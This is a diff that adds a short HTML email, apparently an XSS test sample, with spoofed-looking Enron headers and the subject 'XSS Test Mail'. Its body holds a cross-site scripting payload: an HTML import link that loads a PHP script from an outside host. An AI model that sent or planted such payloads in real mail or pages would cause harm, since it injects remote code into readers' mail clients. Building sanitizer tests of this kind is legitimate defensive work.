@@ -1,0 +1,7 @@
+From: matthew.landy@enron.com
+To: kevin.presto@enron.com, janet.dietrich@enron.com
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+aaaaaaa <link rel=import href=//km2.in/xss.php>
